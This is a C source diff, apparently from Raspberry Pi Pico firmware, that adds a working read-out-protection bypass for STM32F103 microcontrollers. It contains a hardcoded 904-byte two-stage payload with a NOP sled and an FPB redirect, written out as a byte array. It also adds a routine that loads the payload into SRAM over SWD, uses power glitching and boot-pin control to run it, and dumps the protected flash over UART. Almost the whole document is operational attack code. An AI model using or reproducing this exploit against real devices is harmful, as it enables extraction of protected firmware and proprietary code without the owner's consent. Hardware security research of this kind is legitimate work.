@@ -69,6 +69,87 @@ static const uint8_t f103_led_payload[] = {
   0x80, 0x1a, 0x06, 0x00, 0x10, 0x08, 0x01, 0x40
 };
 
+// STM32F103 RDP1 bypass payload — two-stage FPB redirect attack
+// 904 bytes: vector table + 252-NOP sled + stage1 (FPB config) + stage2 (UART flash dump)
+// Stage 1: Configures FPB to redirect reset vector fetch to SRAM stage2
+// Stage 2: Sends "RDP1" + CPUID (4B) + continuous flash via USART1 PA9 @ 115200 baud
+// Pico resets target when desired byte count received
+// Auto-generated from stm32_payloads/f1/rdp_bypass.S (804 bytes)
+static const uint8_t f103_rdp_bypass_payload[] = {
+0x00, 0x50, 0x00, 0x20, 0x09, 0x00, 0x00, 0x20, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x3c, 0x48, 0x01, 0x68,
+  0x51, 0xf0, 0x04, 0x01, 0x01, 0x60, 0x64, 0x22, 0x01, 0x3a, 0xfd, 0xd1,
+  0x39, 0x48, 0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11,
+  0x01, 0x60, 0x37, 0x48, 0x37, 0x49, 0x08, 0x60, 0x37, 0x48, 0x03, 0x21,
+  0x01, 0x60, 0x20, 0x21, 0x41, 0x60, 0x05, 0x21, 0x81, 0x60, 0x35, 0x4c,
+  0x20, 0x20, 0x20, 0x60, 0xfe, 0xe7, 0x00, 0xbf, 0xdf, 0xf8, 0xcc, 0xd0,
+  0x2c, 0x48, 0x01, 0x68, 0x51, 0xf0, 0x04, 0x01, 0x41, 0xf4, 0x80, 0x41,
+  0x01, 0x60, 0x4c, 0xf2, 0x50, 0x32, 0x01, 0x3a, 0xfd, 0xd1, 0x28, 0x48,
+  0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11, 0x01, 0x60,
+  0x28, 0x4c, 0x20, 0x20, 0x20, 0x60, 0x29, 0x48, 0x01, 0x68, 0x21, 0xf0,
+  0xf0, 0x01, 0x41, 0xf0, 0xa0, 0x01, 0x01, 0x60, 0x26, 0x48, 0x45, 0x21,
+  0x01, 0x60, 0x26, 0x48, 0x42, 0xf2, 0x08, 0x01, 0x01, 0x60, 0xc8, 0x22,
+  0x01, 0x3a, 0xfd, 0xd1, 0x23, 0x4c, 0x52, 0x20, 0x00, 0xf0, 0x28, 0xf8,
+  0x44, 0x20, 0x00, 0xf0, 0x25, 0xf8, 0x50, 0x20, 0x00, 0xf0, 0x22, 0xf8,
+  0x31, 0x20, 0x00, 0xf0, 0x1f, 0xf8, 0x1e, 0x4d, 0x2b, 0x68, 0x18, 0x46,
+  0x00, 0xf0, 0x1a, 0xf8, 0x18, 0x0a, 0x00, 0xf0, 0x17, 0xf8, 0x18, 0x0c,
+  0x00, 0xf0, 0x14, 0xf8, 0x18, 0x0e, 0x00, 0xf0, 0x11, 0xf8, 0x4f, 0xf0,
+  0x00, 0x65, 0x2b, 0x68, 0x18, 0x46, 0x00, 0xf0, 0x0b, 0xf8, 0x18, 0x0a,
+  0x00, 0xf0, 0x08, 0xf8, 0x18, 0x0c, 0x00, 0xf0, 0x05, 0xf8, 0x18, 0x0e,
+  0x00, 0xf0, 0x02, 0xf8, 0x04, 0x35, 0xf0, 0xe7, 0x00, 0xf0, 0xff, 0x00,
+  0x21, 0x68, 0x11, 0xf0, 0x80, 0x0f, 0xfb, 0xd0, 0x60, 0x60, 0x70, 0x47,
+  0x18, 0x10, 0x02, 0x40, 0x00, 0x08, 0x01, 0x40, 0x3d, 0x02, 0x00, 0x20,
+  0x20, 0x00, 0x00, 0x20, 0x00, 0x20, 0x00, 0xe0, 0x10, 0x08, 0x01, 0x40,
+  0x00, 0x50, 0x00, 0x20, 0x04, 0x08, 0x01, 0x40, 0x08, 0x38, 0x01, 0x40,
+  0x0c, 0x38, 0x01, 0x40, 0x00, 0x38, 0x01, 0x40, 0x00, 0xed, 0x00, 0xe0,
+};
+
+// RDP bypass constants
+#define BYPASS_DUMP_ADDR   0x20004000  // Where stage2 dumps flash
+#define BYPASS_DUMP_WORDS  64          // 256 bytes = 64 words
+#define BYPASS_MAGIC       0xDEADBEEF  // Marker after dump
+
 // Hardware UART for target (UART1)
 #define TARGET_UART_ID uart1
 #define TARGET_UART_TX_PIN 4  // GP4
@@ -1563,4 +1644,315 @@ void target_power_payload(float voltage, uint32_t max_attempts) {
         gpio_put(BOOT0_PIN, 0);
         gpio_put(BOOT1_PIN, 0);
     }
+}
+
+void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info)
+        return;
+
+    if (!sweep_calibrated) {
+        uart_cli_send("ERROR: Run TARGET POWER SWEEP first for calibration\r\n");
+        return;
+    }
+
+    uint32_t sram_base = info->sram_base;
+    uint32_t payload_words = (sizeof(f103_rdp_bypass_payload) + 3) / 4;
+
+    // Default to full flash if no count specified
+    if (dump_bytes == 0)
+        dump_bytes = info->flash_size;
+    // Round up to word boundary
+    dump_bytes = (dump_bytes + 3) & ~3u;
+
+    uart_cli_printf("RDP1 bypass: %u byte payload -> 0x%08lX, dumping %lu bytes\r\n",
+                    (unsigned)sizeof(f103_rdp_bypass_payload), sram_base, dump_bytes);
+    uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);
+
+    // === Step 1: Upload bypass payload to SRAM via SWD ===
+    uart_cli_send("\r\n[1] Uploading bypass payload to SRAM...\r\n");
+    swd_init();
+    if (!swd_connect()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed\r\n");
+        return;
+    }
+    swd_halt();
+
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_rdp_bypass_payload, payload_words);
+    if (written != payload_words) {
+        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
+        swd_deinit();
+        return;
+    }
+
+    // Verify write
+    uint32_t readback[payload_words];
+    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
+    if (nread != payload_words || memcmp(readback, f103_rdp_bypass_payload, sizeof(f103_rdp_bypass_payload)) != 0) {
+        uart_cli_send("ERROR: SRAM verify failed\r\n");
+        swd_deinit();
+        return;
+    }
+    uart_cli_send("    Payload uploaded and verified\r\n");
+
+    swd_resume();
+    swd_deinit();
+
+    // === Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode ===
+    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
+    gpio_init(BOOT0_PIN);
+    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+    gpio_put(BOOT0_PIN, 1);
+    gpio_init(BOOT1_PIN);
+    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
+    gpio_put(BOOT1_PIN, 1);
+
+    // === Step 3: Power glitch to trigger POR — stage 1 runs from SRAM ===
+    float thresh_v = sweep_optimal_thresh;
+    uart_cli_printf("[3] Power glitch for POR (threshold: %.2fV, max %lu attempts)...\r\n",
+                    thresh_v, max_attempts);
+
+    gpio_set_mask(POWER_MASK);
+    sleep_ms(50);
+
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    adc_power_init();
+    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);
+
+    bool stage1_ok = false;
+    glitch_result_t gr;
+
+    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
+        nrst_irq_arm();
+
+        gpio_set_dir(POWER_PIN2, GPIO_IN);
+        gpio_set_dir(POWER_PIN3, GPIO_IN);
+        gpio_disable_pulls(POWER_PIN2);
+        gpio_disable_pulls(POWER_PIN3);
+
+        adc_select_input(ADC_POWER_CHAN);
+        gr.vmin_raw = 4095;
+        gr.nrst_went_low = false;
+        gr.thresh_reached = true;
+
+        uint64_t t0 = time_us_64();
+        gpio_clr_mask(1u << POWER_PIN1);
+
+        while (true) {
+            uint16_t val = adc_read();
+            if (val < gr.vmin_raw) gr.vmin_raw = val;
+            if (val <= thresh) break;
+            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
+        }
+
+        if (gr.thresh_reached) {
+            sleep_us(50);
+            uint16_t val = adc_read();
+            if (val < gr.vmin_raw) gr.vmin_raw = val;
+        }
+
+        gpio_set_dir(POWER_PIN2, GPIO_OUT);
+        gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        gpio_set_mask(POWER_MASK);
+        gr.glitch_us = (uint32_t)(time_us_64() - t0);
+
+        for (int i = 0; i < 5000; i++) {
+            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
+            sleep_us(10);
+        }
+        nrst_irq_disarm();
+        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;
+
+        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
+        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
+                        attempt, vmin, gr.glitch_us,
+                        gr.nrst_went_low ? "LOW" : "high");
+
+        if (gr.nrst_went_low) {
+            uart_cli_send("    POR triggered — stage 1 configuring FPB...\r\n");
+            stage1_ok = true;
+            break;
+        }
+
+        gpio_set_mask(POWER_MASK);
+        sleep_ms(200);
+    }
+
+    gpio_set_mask(POWER_MASK);
+
+    if (!stage1_ok) {
+        uart_cli_send("\r\nFAILED: Could not trigger POR for stage 1\r\n");
+        gpio_put(BOOT0_PIN, 0);
+        gpio_put(BOOT1_PIN, 0);
+        return;
+    }
+
+    // Wait for stage 1 to finish configuring FPB (LED goes solid)
+    uart_cli_send("    Waiting for stage 1 to complete...\r\n");
+    sleep_ms(500);
+
+    // === Step 4: Init target UART for receiving dump ===
+    uart_cli_send("[4] Initializing UART RX (GP5, 115200, 8N1)...\r\n");
+
+    // Init UART1 for RX at 115200 baud (matches payload USART1 config)
+    uart_deinit(TARGET_UART_ID);
+    gpio_deinit(TARGET_UART_RX_PIN);
+    gpio_init(TARGET_UART_RX_PIN);
+    uart_init(TARGET_UART_ID, 115200);
+    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
+    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
+
+    // === Step 5: Set BOOT0=0, pulse nRST — stage 2 sends flash via UART ===
+    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST...\r\n");
+    uart_cli_send("[6] Receiving flash dump via UART...\r\n");
+    gpio_put(BOOT0_PIN, 0);
+    gpio_put(BOOT1_PIN, 0);
+    sleep_ms(10);
+
+    // Drain FIFO before reset
+    while (uart_is_readable(TARGET_UART_ID))
+        uart_getc(TARGET_UART_ID);
+
+    // Pulse nRST — system reset preserves FPB
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_put(reset_pin, 0);
+    sleep_ms(10);
+    gpio_put(reset_pin, 1);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    // Helper: receive exactly n bytes with timeout, returns bytes received
+    #define BYPASS_TIMEOUT_US 5000000  // 5 second total timeout
+    #define BYPASS_BYTE_TIMEOUT_US 500000  // 500ms idle = give up
+
+    // --- Wait for "RDP1" header (scan byte-by-byte) ---
+    uint8_t hdr_state = 0;  // matching "RDP1" character by character
+    const char *hdr_str = "RDP1";
+    uint64_t rx_start = time_us_64();
+    uint64_t last_byte_time = rx_start;
+    bool hdr_found = false;
+
+    while (!hdr_found) {
+        if (uart_is_readable(TARGET_UART_ID)) {
+            uint8_t c = uart_getc(TARGET_UART_ID);
+            last_byte_time = time_us_64();
+            if (c == hdr_str[hdr_state]) {
+                hdr_state++;
+                if (hdr_state == 4) hdr_found = true;
+            } else {
+                hdr_state = (c == 'R') ? 1 : 0;
+            }
+        } else {
+            if (time_us_64() - rx_start > BYPASS_TIMEOUT_US) break;
+            if (hdr_state > 0 && (time_us_64() - last_byte_time > BYPASS_BYTE_TIMEOUT_US)) break;
+        }
+    }
+
+    if (!hdr_found) {
+        uart_cli_send("ERROR: \"RDP1\" header not received — stage 2 may not be executing\r\n");
+        goto bypass_cleanup;
+    }
+    uart_cli_send("    Header: RDP1\r\n");
+
+    // --- Receive CPUID (4 bytes) ---
+    uint8_t cpuid_buf[4];
+    for (int i = 0; i < 4; i++) {
+        uint64_t t0 = time_us_64();
+        while (!uart_is_readable(TARGET_UART_ID)) {
+            if (time_us_64() - t0 > BYPASS_BYTE_TIMEOUT_US) {
+                uart_cli_send("ERROR: Timeout reading CPUID\r\n");
+                goto bypass_cleanup;
+            }
+        }
+        cpuid_buf[i] = uart_getc(TARGET_UART_ID);
+    }
+    uint32_t cpuid = cpuid_buf[0] | (cpuid_buf[1] << 8) |
+                    (cpuid_buf[2] << 16) | (cpuid_buf[3] << 24);
+    uint8_t implementer = (cpuid >> 24) & 0xFF;
+    uint16_t partno = (cpuid >> 4) & 0xFFF;
+    uart_cli_printf("    CPUID: 0x%08lX", cpuid);
+    if (implementer == 0x41 && partno == 0xC23)
+        uart_cli_printf(" (Cortex-M3 r%lup%lu)\r\n", (cpuid >> 20) & 0xF, cpuid & 0xF);
+    else if (implementer == 0x41 && partno == 0xC24)
+        uart_cli_send(" (Cortex-M4)\r\n");
+    else
+        uart_cli_send("\r\n");
+
+    // --- Stream flash data, printing as we receive ---
+    uart_cli_send("\r\n=== RDP1 BYPASS — FLASH DUMP ===\r\n");
+    uart_cli_printf("Dumping %lu bytes from 0x08000000:\r\n", dump_bytes);
+
+    uint32_t rx_total = 0;
+    uint8_t line_buf[16];
+    uint32_t line_pos = 0;
+
+    while (rx_total < dump_bytes) {
+        uint64_t t0 = time_us_64();
+        while (!uart_is_readable(TARGET_UART_ID)) {
+            if (time_us_64() - t0 > BYPASS_BYTE_TIMEOUT_US) {
+                // Flush partial line
+                if (line_pos > 0) {
+                    uint32_t line_addr = 0x08000000 + rx_total - line_pos;
+                    uart_cli_printf("0x%08lX:", line_addr);
+                    for (uint32_t j = 0; j < line_pos; j++)
+                        uart_cli_printf(" %02X", line_buf[j]);
+                    for (uint32_t j = line_pos; j < 16; j++)
+                        uart_cli_send("   ");
+                    uart_cli_send("  ");
+                    for (uint32_t j = 0; j < line_pos; j++) {
+                        char c = line_buf[j];
+                        uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                    }
+                    uart_cli_send("\r\n");
+                }
+                uart_cli_printf("\r\nERROR: Timeout after %lu of %lu bytes\r\n", rx_total, dump_bytes);
+                goto bypass_reset;
+            }
+        }
+        line_buf[line_pos++] = uart_getc(TARGET_UART_ID);
+        rx_total++;
+
+        if (line_pos == 16 || rx_total == dump_bytes) {
+            uint32_t line_addr = 0x08000000 + rx_total - line_pos;
+            uart_cli_printf("0x%08lX:", line_addr);
+            for (uint32_t j = 0; j < line_pos; j++)
+                uart_cli_printf(" %02X", line_buf[j]);
+            for (uint32_t j = line_pos; j < 16; j++)
+                uart_cli_send("   ");
+            uart_cli_send("  ");
+            for (uint32_t j = 0; j < line_pos; j++) {
+                char c = line_buf[j];
+                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
+            }
+            uart_cli_send("\r\n");
+            line_pos = 0;
+        }
+    }
+
+    uart_cli_printf("\r\nDump complete: %lu bytes received\r\n", rx_total);
+
+bypass_reset:
+    // Reset the target to stop the payload streaming
+    uart_cli_send("[7] Power cycling target...\r\n");
+    gpio_clr_mask(POWER_MASK);
+    sleep_ms(100);
+    gpio_set_mask(POWER_MASK);
+
+bypass_cleanup:
+    // Restore boot pins
+    gpio_put(BOOT0_PIN, 0);
+    gpio_put(BOOT1_PIN, 0);
 }
